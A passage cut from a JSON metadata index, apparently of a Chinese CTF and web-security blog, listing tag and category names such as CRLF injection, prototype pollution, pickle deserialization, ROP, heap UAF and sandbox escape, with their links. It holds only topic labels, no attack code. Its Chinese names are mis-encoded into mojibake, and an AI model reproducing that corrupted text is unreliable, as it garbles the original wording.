","link":"/tags/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"name":"CRLFæ³¨å…¥","slug":"CRLFæ³¨å…¥","link":"/tags/CRLF%E6%B3%A8%E5%85%A5/"},{"name":"JavaScript","slug":"JavaScript","link":"/tags/JavaScript/"},{"name":"NodeJS","slug":"NodeJS","link":"/tags/NodeJS/"},{"name":"NodeJSç¼–ç å®‰å…¨","slug":"NodeJSç¼–ç å®‰å…¨","link":"/tags/NodeJS%E7%BC%96%E7%A0%81%E5%AE%89%E5%85%A8/"},{"name":"Machine Learning","slug":"Machine-Learning","link":"/tags/Machine-Learning/"},{"name":"Neural Network","slug":"Neural-Network","link":"/tags/Neural-Network/"},{"name":"PaillieråŠ å¯†","slug":"PaillieråŠ å¯†","link":"/tags/Paillier%E5%8A%A0%E5%AF%86/"},{"name":"Integer Overflow","slug":"Integer-Overflow","link":"/tags/Integer-Overflow/"},{"name":"md5ç¢°æ’","slug":"md5ç¢°æ’","link":"/tags/md5%E7%A2%B0%E6%92%9E/"},{"name":"md5å¼±æ¯”è¾ƒ","slug":"md5å¼±æ¯”è¾ƒ","link":"/tags/md5%E5%BC%B1%E6%AF%94%E8%BE%83/"},{"name":"md5å¼ºæ¯”è¾ƒ","slug":"md5å¼ºæ¯”è¾ƒ","link":"/tags/md5%E5%BC%BA%E6%AF%94%E8%BE%83/"},{"name":"CRC32çˆ†ç ´","slug":"CRC32çˆ†ç ´","link":"/tags/CRC32%E7%88%86%E7%A0%B4/"},{"name":"åŒå†™æ³¨å…¥","slug":"åŒå†™æ³¨å…¥","link":"/tags/%E5%8F%8C%E5%86%99%E6%B3%A8%E5%85%A5/"},{"name":"PHP7è§£æç‰¹æ€§bypass","slug":"PHP7è§£æç‰¹æ€§bypass","link":"/tags/PHP7%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7bypass/"},{"name":"ROP","slug":"ROP","link":"/tags/ROP/"},{"name":"arm pwn","slug":"arm-pwn","link":"/tags/arm-pwn/"},{"name":"leak canary","slug":"leak-canary","link":"/tags/leak-canary/"},{"name":"heap UAF","slug":"heap-UAF","link":"/tags/heap-UAF/"},{"name":"Deep Learning","slug":"Deep-Learning","link":"/tags/Deep-Learning/"},{"name":"GPU calculation","slug":"GPU-calculation","link":"/tags/GPU-calculation/"},{"name":"JSæ²™ç®±é€ƒé€¸","slug":"JSæ²™ç®±é€ƒé€¸","link":"/tags/JS%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"name":"JSæ¨¡æ¿å­—ç¬¦ä¸²","slug":"JSæ¨¡æ¿å­—ç¬¦ä¸²","link":"/tags/JS%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2/"},{"name":"JSå¼±ç±»å‹","slug":"JSå¼±ç±»å‹","link":"/tags/JS%E5%BC%B1%E7%B1%BB%E5%9E%8B/"},{"name":"ä¸‡èƒ½å¯†ç ç»•è¿‡orè¿‡æ»¤","slug":"ä¸‡èƒ½å¯†ç ç»•è¿‡orè¿‡æ»¤","link":"/tags/%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87or%E8%BF%87%E6%BB%A4/"},{"name":"PHP sessionååºåˆ—åŒ–æ¼æ´","slug":"PHP-sessionååºåˆ—åŒ–æ¼æ´","link":"/tags/PHP-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"name":"bypass URLé™åˆ¶","slug":"bypass-URLé™åˆ¶","link":"/tags/bypass-URL%E9%99%90%E5%88%B6/"},{"name":"çŸ­å‘½ä»¤æ‰§è¡Œ","slug":"çŸ­å‘½ä»¤æ‰§è¡Œ","link":"/tags/%E7%9F%AD%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"pickleååºåˆ—åŒ–","slug":"pickleååºåˆ—åŒ–","link":"/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"ä¼ªé€ mysql-serverå®ç°ä»»æ„è¯»å–","slug":"ä¼ªé€ mysql-serverå®ç°ä»»æ„è¯»å–","link":"/tags/%E4%BC%AA%E9%80%A0mysql-server%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"webå®‰å…¨","slug":"CTF/webå®‰å…¨","link":"/categories/CTF/web%E5%AE%89%E5%85%A8/"},{"name":"èµ›é¢˜å¤ç°","slug":"CTF/èµ›é¢˜å¤ç°","link":"/categories/CTF/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"},{"name":"æ¯”èµ›åˆ’æ°´","slug":"CTF/æ¯”èµ›åˆ’æ°´","link":"/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"},{"name":"çæ‰æ‘¸çš„ä¸€äº›å­¦ä¹ ","slug":"çæ‰æ‘¸çš„ä¸€äº›å­¦ä¹ ","link":"/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/"},{"name":"BUUåˆ·é¢˜","slug":"CTF/webå®‰å…¨/BUUåˆ·é¢˜","link":"/categories/CTF/web%E5%AE%89%E5%85%A8/BUU%E5%88%B7%E9%A2%98/"},{"name":"äºŒè¿›åˆ¶","slug":"CTF/äºŒè¿›åˆ¶","link":"/categories/CTF/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"CTFHubåˆ·é¢˜","slug":"CTF/webå®‰å…¨/CTFHubåˆ·é¢˜","link":"/categories/CTF/web%E5%AE%89%E5%85%A8/CTFHub%E5%88%B7%E9%A2%98/"},{"name":"obfs4ç½‘æ¡¥æ­å»º","slug":"çæ‰æ‘¸çš„ä¸€äº›å­¦ä¹ /obfs4ç½‘æ¡¥æ­å»º","link":"/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/obfs4%E7%BD%91%E6%A1%A5%E6%90%AD%E5%BB%BA/"},{"name":"FTPæœåŠ¡å™¨æ­å»º","slug":"çæ‰æ‘¸çš„ä¸€äº›å­¦ä¹ /FTPæœåŠ¡å™¨æ­å»º","link":"/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","link":"/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"æ¶æ„ä»£ç ","slug":"çæ‰æ‘¸çš„ä¸€äº›å­¦ä¹ /æ¶æ„ä»£ç ","link":"/categories/%E7%9E%8E%E6%8D%89%E6%91%B8%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"}]}